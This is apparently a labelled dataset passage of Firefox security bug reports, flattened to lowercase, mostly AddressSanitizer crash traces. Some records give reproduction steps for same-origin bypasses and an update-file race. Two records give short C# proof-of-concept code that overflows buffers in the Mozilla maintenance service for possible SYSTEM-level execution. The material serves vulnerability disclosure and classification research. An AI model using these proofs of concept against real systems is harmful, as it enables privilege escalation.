proxy_call jscontext unsigned int js value js/src/jsproxy.cpp:3175 28 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:346 29 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:401 30 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2265 31 in js runscript jscontext js stackframe js/src/jsinterp.cpp:365 32 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value js/src/jsinterp.cpp:550 33 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:589 34 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:5645 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:201 3 in nshtml5treeoperation appendtext unsigned short const unsigned int nsicontent nshtml5treeopexecutor parser/html/nshtml5treeoperation.cpp:167 4 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:459 5 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:557 6 in nshtml5executorflusher run parser/html/nshtml5streamparser.cpp:125 7 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627 8 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 9 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 10 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 11 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 12 in messageloop run ipc/chromium/src/base/message_loop.cc:186 13 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 14 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 15 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3872 16 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3939 17 in xre_main toolkit/xre/nsapprunner.cpp:4140 18 in do_main int char nsifile browser/app/nsbrowserapp.cpp:272 19 in main browser/app/nsbrowserapp.cpp:632 20 in shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 14882 aborting	11
abort bad scope for new jsobjects js isobjectincontextcompartment lccx.getscopefornewjsobjects cx under reparentwrapper document.open str 1 paste the following into the live dom viewer iframe src=about blank iframe script onload function document.open script 2 type something random on the empty line	11
cross domain policy override using webworkers user agent mozilla/5.0 x11 linux x86_64 rv:18.0 gecko/20100101 firefox/18.0 beta/release build id 20130206152201 steps to reproduce i create a web worker in hosta the webworker has instructions to send a xmlhttprequest to hostb also this request include custom headers i have try the same xmlhttprequest using regular javascript and it wont work the security check are in place that way the problem is related to the webworkers actual results the request went thought attached firefox images and burp proxy expected results this is not compliant with the same domain policy also the ability to include custom headers could be a mayor problem as is a vector to attack csrf protection based on headers	2
global buffer overflow read 4 at nsfloatmanager getflowarea with multicol list floats opening several of the attached page at once causes asan to spot a global buffer overflow in current aurora and beta asan builds most of the time the read is aligned and pretty far away from adjecent objects so filing as a potential security issue since it s not obvious we re always reading something fixed like padding bytes with fixed outcome the original even larger testcase needed just two of them to trigger this reliably the attached somewhat reduced page still hits this most of the time let me know if you have trouble reproducing because this could be related to machine speed etc opt/firefox-aurora-asan/firefox ff-gbof-getflowarea.html 2 1 symbolize c++filt 14198 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in nsfloatmanager getflowarea int nsfloatmanager bandinfotype int nsrect nsfloatmanager savedstate const home/aki/src/mozilla-aurora/layout/generic/nsfloatmanager.cpp:140 is located 32 bytes to the left of global variable mozilla sse_private sse3_enabled home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/sse.cpp of size 1 is located 24 bytes to the right of global variable nstarrayheader semptyhdr home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/nstarray.cpp of size 8 nstarrayheader semptyhdr home/aki/src/mozilla-aurora/objdir-ff-asan/xpcom/build/nstarray.cpp is ascii string shadow byte and word f9 00 f9 f9 f9 f9 f9 f9 f9 more shadow bytes 04 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9 stats 150m malloced 212m for red zones by 600810 calls stats 12m realloced by 34962 calls stats 102m freed by 265916 calls stats 0m really freed by 0 calls stats 400m 102447 full pages mmaped in 100 calls mmaps by size class 8:524256 9:57337 10:24570 11:16376 12:4096 13:4096 14:1280 15:512 16:1152 17:128 18:32 19:8 20:4 mallocs by size class 8:502183 9:54311 10:19963 11:14517 12:3446 13:3628 14:1128 15:394 16:1111 17:100 18:17 19:8 20:4 frees by size class 8:202047 9:33734 10:12283 11:11046 12:2220 13:2726 14:536 15:272 16:944 17:90 18:11 19:4 20:3 rfrees by size class stats malloc large 129 small slow 2773 14198 aborting	11
valgrind errors in js testsuite conditional jumps on uninitialized data i happened to run js/src/tests/jstests.py in valgrind mode and found two unique errors which i have confirmed i do n't yet know the scope of the problems i believe both are relatively easy to fix first the variable gotlambda in js/src/ion/ionbuilder.cpp is being used uninitialized it is declared without an initializer and the statement which would assign to it is inside an if statement and is not always executed several uses of gotlambda follow this can probably be fixed by just initializing the gotlambda variable up front second js1_5/extensions/regress-341956-01.js and js1_2/array/splice1.js see conditional jumps on uninitialized data it appears a block gets created by js/src/ion/ionbuilder.cpp inlineblock which is later discarded natives may veto inlining but it still has a resume point which has a use of a value in a block that is not discarded when range analysis walks def-use graphs it finds this use and wanders into the discarded block which has an uninitialized domindex field this can probably be fixed by clearing out the resume points of the block when it is discarded	11
installtrigger can use the wrong principal when validating uri loads user agent mozilla/5.0 windows nt 6.1 wow64 rv:21.0 gecko/20100101 firefox/21.0 beta/release build id 20130511120803 steps to reproduce i held a reference to the eval function of another window before loading the new pdf.js implementation in that window and then used that reference to show that components/extensions implementing their own security checks can potentially allow unsafe actions to be performed from content actual results since the pdf.js implementation has access to resource and file urls it was possible to use installtrigger to issue a warning to the error console/firebug demonstrating that it actually uses the principal of the new pdf viewer when performing its own security checks which happen here 152 this is a potential concern in other javascript components that use the document of the window they re accessible from to perform checks against urls before performing sensitive actions and could also potentially be used to bypass the same origin policy and other all around nastiness i had some success before firefox 21 installing webapps for other domains with this technique but didnt see it as a very big concern since access to navigator.mozapps.mgmt has since been properly handled which means that any domrequest object returned from such an install will be a cross compartment wrapper and deny access in this instance i showed that installtrigger gains local filesystem access in the warning that results expected results i should have received the normal exception that results from passing a file url to installtrigger.install from content in this instance this is the fault of the installtrigger object so i m sure there s other code that this should raise concerns about	5
buffer overflow in updater using specially crafted arguments an attacker can cause a buffer overflow in the updater executable l2940 the maintenance service passes all arguments provided to it along to the updater so it can be used to trigger the overflow which can potentially lead to arbitrary code execution with system privileges the vulnerability occurs when the replace flag is given along with a long callback path c proof-of-concept using system using system.serviceprocess namespace replacebufferoverflow class program static void main string args try servicecontroller c new servicecontroller mozillamaintenance c.start new string aaa software-update c program files x86 mozilla firefox\updater.exe c program files x86 mozilla firefox c program files x86 mozilla firefox\uninstall replace ccccc new string a',999 catch exception e console.writeline e i can replicate on windows 7 x64 with updater.exe version 22.0.0.4917 and maintenanceservice.exe version 23.0.0.4921 the result is an entry in the windows application event log that looks similar to this event id 1000 faulting application name updater.exe version 22.0.0.4917 time stamp faulting module name unknown version 0.0.0.0 time stamp exception code fault offset faulting process id faulting application start time faulting application path c program files x86 mozilla maintenance service\update\updater.exe faulting module path unknown i have attached a compiled version of the proof-of-concept code let me know if you need any further details	11
buffer overflow in writestatusfailure in maintenanceservice.exe the writestatusfailure function in updatehelper.cpp fails to check the length of the update directory path provided before copying it into a string with a buffer of only max_path+1 length l396 the maintenance service passes a user-provided argument directly into this function which leads to a buffer overflow and potential arbitrary code execution with system privileges c proof-of-concept using system using system.serviceprocess namespace writestatusbufferoverflow class program static void main string args try servicecontroller c new servicecontroller mozillamaintenance c.start new string aaa software-update c program files x86 mozilla firefox\updater.exe new string a',999 catch exception e console.writeline e replicated on windows 7 x64 with maintenanceservice.exe version 23.0.0.4923 the result is an entry in the windows application event log that looks similar to this faulting application name maintenanceservice.exe version 23.0.0.4923 time stamp faulting module name maintenanceservice.exe version 23.0.0.4923 time stamp exception code fault offset faulting process id faulting application start time faulting application path c program files x86 mozilla maintenance service\maintenanceservice.exe faulting module path c program files x86 mozilla maintenance service\maintenanceservice.exe have attached a compiled proof-of-concept let me know if you need any further details	11
heap-buffer-overflow read in nshtml5treebuilder resettheinsertionmode tested on os ubuntu 12.04 firefox asan debug-build from asan-report 8023 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t16 0 in nshtml5treebuilder resettheinsertionmode builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5treebuilder.cpp:3247 1 in nshtml5treebuilder eof builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5treebuilder.cpp:529 2 in nshtml5streamparser parseavailabledata builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5streamparser.cpp:1293 3 in nshtml5streamparsercontinuation run builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5streamparser.cpp:1355 4 in nsthread processnextevent bool bool builds/slave/m-cen-l64-dbg-asan-00000000000/build/xpcom/threads/nsthread.cpp:626 5 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-dbg-asan-00000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238 6 in nsthread threadfunc void builds/slave/m-cen-l64-dbg-asan-00000000000/build/xpcom/threads/nsthread.cpp:264 7 in pt_root builds/slave/m-cen-l64-dbg-asan-00000000000/build/nsprpub/pr/src/pthreads/ptthread.c:204 8 in asan asanthread threadstart 0 is located 4 bytes to the left of 256-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc builds/slave/m-cen-l64-dbg-asan-00000000000/build/memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long builds/slave/m-cen-l64-dbg-asan-00000000000/build dist/include/mozilla/mozalloc.h:213 3 in nshtml5treebuilder starttokenization nshtml5tokenizer builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5treebuilder.cpp:77 4 in nshtml5streamparser onstartrequest nsirequest nsisupports builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nshtml5streamparser.cpp:880 5 in nsdocumentopeninfo onstartrequest nsirequest nsisupports builds/slave/m-cen-l64-dbg-asan-00000000000/build/uriloader/base/nsuriloader.cpp:262 6 in nsbasechannel onstartrequest nsirequest nsisupports builds/slave/m-cen-l64-dbg-asan-00000000000/build/netwerk/base/src/nsbasechannel.cpp:720	11
mar signature bypass in updater could lead to downgrade the updater does n't write-lock the user-supplied mar file while it is using it this leads to a race condition between the mar file s signatures being validated and the actual access of data within the file if an attacker can change the file after the mar signatures are validated but before data is read the attacker supplied mar data will be what the updater uses the proof-of-concept uses this to replace the version string which allows us to downgrade firefox to a vulnerable version at which point an attacker could use a previous vulnerability such as 888314 to execute arbitrary code i d imagine with further investigation into the mar file format an attacker could feasibly have the updater extract and run their own files as part of the update process as well this all runs as the system user proof-of-concept is attached it expects the current directory to hold an update.original.mar file tested with which it will use to downgrade the firefox installation in c program files x86 mozilla firefox as with race conditions timing can be a little finicky on my pc win7 x64 updater.exe 22.0.0.4917 i find there s a 200ms window between 250-450ms given no arguments the poc will start at 200ms and work its way up to 1000ms in 10ms increments until it succeeds	2
nativekey should not continue handling key message if widget is destroyed after dispatching event i realized that widget nativekey does n't stop handling key message even if widget is destroyed by dispatching key event i m not sure the risk of this bug though	11
heap-use-after-free in nsanimationmanager buildanimations need to install fuzzpriv extension usually reproduces in one try but do try with reload if it does not 1210==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nstarray_base nstarrayinfallibleallocator nstarray_copyelements nsisupports length const dist/include/nstarray.h:371 1 in nscomarray_base count const dist/include/nscomarray.h:95 2 in mozilla css grouprule stylerulecount const dist/include/mozilla/css/grouprule.h:54 3 in nsanimationmanager buildanimations nsstylecontext nstarray elementanimation layout/style/nsanimationmanager.cpp:783 4 in nsanimationmanager checkanimationrule nsstylecontext mozilla dom element layout/style/nsanimationmanager.cpp:568 5 in nsstyleset getcontext nsstylecontext nsrulenode nsrulenode nsiatom nscsspseudoelements type mozilla dom element unsigned int layout/style/nsstyleset.cpp:833 6 in nsstyleset resolvestylefor mozilla dom element nsstylecontext treematchcontext layout/style/nsstyleset.cpp:1205 7 in nsframemanager reresolvestylecontext nsprescontext nsiframe nsicontent nsstylechangelist nschangehint nschangehint nsrestylehint mozilla css restyletracker nsframemanager desireda11ynotifications nstarray nsicontent treematchcontext layout/base/nsframemanager.cpp:1256 8 in nsframemanager computestylechangefor nsiframe nsstylechangelist nschangehint mozilla css restyletracker bool layout/base/nsframemanager.cpp:1695 9 in nscssframeconstructor restyleelement mozilla dom element nsiframe nschangehint mozilla css restyletracker bool layout/base/nscssframeconstructor.cpp:8340 10 in mozilla css restyletracker processonerestyle mozilla dom element nsrestylehint nschangehint layout/base/restyletracker.cpp:122 11 in mozilla css restyletracker doprocessrestyles layout/base/restyletracker.cpp:209 12 in mozilla css restyletracker processrestyles layout/base/restyletracker.h:217 13 in nscssframeconstructor processpendingrestyles layout/base/nscssframeconstructor.cpp:12071 14 in presshell flushpendingnotifications mozilla changestoflush layout/base/nspresshell.cpp:3858 15 in presshell flushpendingnotifications mozflushtype layout/base/nspresshell.cpp:3743 16 in nsdocument flushpendingnotifications mozflushtype content/base/src/nsdocument.cpp:7085 17 in nsdocloader docloaderisempty bool uriloader/base/nsdocloader.cpp:709 18 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult uriloader/base/nsdocloader.cpp:639 19 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult uriloader/base/nsdocloader.cpp:643 20 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult netwerk/base/src/nsloadgroup.cpp:684 21 in nsdocument dounblockonload content/base/src/nsdocument.cpp:7965 22 in nsdocument unblockonload bool content/base/src/nsdocument.cpp:7893 23 in nsdocument dispatchcontentloadedevents content/base/src/nsdocument.cpp:4680 24 in nsrunnablemethodimpl void nsdocument true run dist/include/nsthreadutils.h:350 25 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:621 26 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 27 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:81 28 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 29 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 30 in messageloop run ipc/chromium/src/base/message_loop.cc:186 31 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 33 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3853 34 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3921 35 in xre_main toolkit/xre/nsapprunner.cpp:4123 36 in do_main int char nsifile browser/app/nsbrowserapp.cpp:272 37 in main browser/app/nsbrowserapp.cpp:632 38 in 39 in start is located 32 bytes inside of 72-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:48 2 in operator delete void dist/include/mozilla/mozalloc.h:225 3 in nscsskeyframesrule nscsskeyframesrule layout/style/nscssrules.cpp:2454 4 in mozilla css grouprule deletecyclecollectable layout/style/nscssrules.cpp:568 5 in mozilla css grouprule cyclecollection deletecyclecollectableimpl void dist/include/mozilla/css/grouprule.h:39 6 in snowwhitekiller snowwhitekiller xpcom/base/nscyclecollector.cpp:2173 7 in snowwhitekiller snowwhitekiller xpcom/base/nscyclecollector.cpp:2168 8 in nscyclecollector freesnowwhite bool xpcom/base/nscyclecollector.cpp:2280 9 in nscyclecollectorrunner collect cctype nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:1171 10 in nscyclecollector collect cctype nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:2883 11 in nscyclecollector_collect bool nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:3312 12 in nsjscontext cyclecollectnow nsicyclecollectorlistener int bool dom/base/nsjsenvironment.cpp:2566 13 in nsdomwindowutils cyclecollect nsicyclecollectorlistener int dom/base/nsdomwindowutils.cpp:1203 14 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 15 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:2795 16 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:2133 17 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2099 18 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1315 19 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:225 20 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:478 21 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2503 22 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:435 23 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:497 24 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value js/src/vm/interpreter.cpp:528 25 in js directproxyhandler call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:451 26 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const js/src/jswrapper.cpp:446 27 in js proxy call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:2633 28 in proxy_call jscontext unsigned int js value js/src/jsproxy.cpp:3205 29 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:225 30 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:471 31 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2503 32 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:435 33 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:497 34 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value js/src/vm/interpreter.cpp:528 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:201 3 in anonymous namespace cssparserimpl parsekeyframesrule void mozilla css rule void void layout/style/nscssparser.cpp:2624 4 in anonymous namespace cssparserimpl parseatrule void mozilla css rule void void bool layout/style/nscssparser.cpp:1673 5 in anonymous namespace cssparserimpl parsesheet nsastring_internal const nsiuri nsiuri nsiprincipal unsigned int bool layout/style/nscssparser.cpp:988 6 in nscssparser parsesheet nsastring_internal const nsiuri nsiuri nsiprincipal unsigned int bool layout/style/nscssparser.cpp:10870 7 in mozilla css loader parsesheet nsastring_internal const mozilla css sheetloaddata bool layout/style/loader.cpp:1628 8 in mozilla css sheetloaddata onstreamcomplete nsiunicharstreamloader nsisupports tag_nsresult nsastring_internal const layout/style/loader.cpp:938 9 in non-virtual thunk to mozilla css sheetloaddata onstreamcomplete nsiunicharstreamloader nsisupports tag_nsresult nsastring_internal const layout/style/loader.cpp:941 10 in nsunicharstreamloader onstoprequest nsirequest nsisupports tag_nsresult netwerk/base/src/nsunicharstreamloader.cpp:99 11 in nsbasechannel onstoprequest nsirequest nsisupports tag_nsresult netwerk/base/src/nsbasechannel.cpp:737 12 in non-virtual thunk to nsbasechannel onstoprequest nsirequest nsisupports tag_nsresult netwerk/base/src/nsbasechannel.cpp:752 13 in nsinputstreampump onstatestop netwerk/base/src/nsinputstreampump.cpp:623 14 in nsinputstreampump oninputstreamready nsiasyncinputstream netwerk/base/src/nsinputstreampump.cpp:395 15 in non-virtual thunk to nsinputstreampump oninputstreamready nsiasyncinputstream netwerk/base/src/nsinputstreampump.cpp:439 16 in nsinputstreamreadyevent run xpcom/io/nsstreamutils.cpp:82 17 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:621 18 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 19 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:81 20 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 21 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 22 in messageloop run ipc/chromium/src/base/message_loop.cc:186 23 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 24 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 25 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3853 26 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3921 27 in xre_main toolkit/xre/nsapprunner.cpp:4123 28 in do_main int char nsifile browser/app/nsbrowserapp.cpp:272 29 in main browser/app/nsbrowserapp.cpp:632 30 in shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 1210==aborting	11
heap-use-after-free in mozilla dom htmlformelement isdefaultsubmitelement asan reports a use-after-free in mozilla dom htmlformelement isdefaultsubmitelement when the attached repro is opened it seems to trigger when a gc happens so it might take a few seconds to crash	11
it s possible to set a document s uri to a different document s uri by confusing docshell bug 803870 was fixed by disallowing cross-origin history access but the key problem is not fixed and it is still abusable with subframe the problem is history.forward a location.hash a b 1 a sets mlshe to a shentry to be loaded 2 b sets mlshe to null and sets moshe to a new shentry 3 the history load is processed but nsdocshell embed does not update moshe since mlshe is null	9
asan segv on unknown address in worker seteventlistener the attached testcase crashes the asan build of firefox with the attached testcase it involves event handlers and exchange of proto attributes similar to bug 831090	11
asan heap-use-after-free in mozilla layout scrollbaractivity the attached testcase crashes the firefox asan build with following asan output the testcase is attached as a zip archive as it requires several files 45947==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr mozilla layout scrollbaractivity get const builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic dist/include/nscomptr.h:800:0 1 in nscomptr mozilla layout scrollbaractivity operator mozilla layout scrollbaractivity const builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic dist/include/nscomptr.h:813:0 2 in nsgfxscrollframeinner setcoordattribute nsicontent nsiatom int builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:3861:0 3 in nsgfxscrollframeinner updatescrollbarposition builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:2941:0 4 in nsgfxscrollframeinner scrolltoimpl nspoint nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:2012:0 5 in nsgfxscrollframeinner scrolltowithorigin nspoint nsiscrollableframe scrollmode nsiatom nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:1651:0 6 in nsgfxscrollframeinner scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.h:172:0 7 in nshtmlscrollframe scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.h:524:0 8 in non-virtual thunk to nshtmlscrollframe scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:4099:0 9 in mozilla dom imagedocument scrollimageto int int bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:379:0 10 in mozilla dom imagedocument shrinktofit builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:336:0 11 in mozilla dom imagedocument checkoverflowing bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:636:0 12 in mozilla dom imagedocument handleevent nsidomevent builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:537:0 13 in non-virtual thunk to mozilla dom imagedocument handleevent nsidomevent builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:565:0 14 in nseventlistenermanager handleeventsubtype nslistenerstruct mozilla dom callbackobjectholder mozilla dom eventlistener nsidomeventlistener const nsidomevent mozilla dom eventtarget nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventlistenermanager.cpp:941:0 15 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent mozilla dom eventtarget nseventstatus nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventlistenermanager.cpp:1012:0 16 in nseventtargetchainitem currenttarget builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventlistenermanager.h:328:0 17 in nseventtargetchainitem handleevent nseventchainpostvisitor elmcreationdetector nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventdispatcher.cpp:221:0 18 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor nsdispatchingcallback elmcreationdetector nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventdispatcher.cpp:342:0 19 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray mozilla dom eventtarget builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventdispatcher.cpp:644:0 20 in presshell fireresizeevent builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:1956:0 21 in presshell flushpendingnotifications mozilla changestoflush builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:3807:0 22 in presshell handlepostedreflowcallbacks bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:3711:0 23 in presshell diddoreflow bool bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:7663:0 24 in presshell resizereflowignoreoverride int int builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:1885:0 25 in nsviewmanager dosetwindowdimensions int int builds/slave/m-cen-l64-asan-ntly-0000000000/build/view/src/nsviewmanager.cpp:197:0 26 in nsviewmanager setwindowdimensions int int builds/slave/m-cen-l64-asan-ntly-0000000000/build/view/src/nsviewmanager.cpp:217:0 27 in nsdocumentviewer setbounds nsintrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsdocumentviewer.cpp:1874:39 28 in nsdocumentviewer setbounds nsintrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsdocumentviewer.cpp:1886:0 29 in nsdocshell setpositionandsize int int int int bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/docshell/base/nsdocshell.cpp:5101:0 30 in non-virtual thunk to nsdocshell setpositionandsize int int int int bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/docshell/base/nsdocshell.cpp:5105:0 31 in nsframeloader updatebasewindowpositionandsize nssubdocumentframe builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsframeloader.cpp:1884:0 32 in nsframeloader updatepositionandsize nssubdocumentframe builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsframeloader.cpp:1858:0 33 in nssubdocumentframe reflowfinished builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nssubdocumentframe.cpp:692:0 34 in non-virtual thunk to 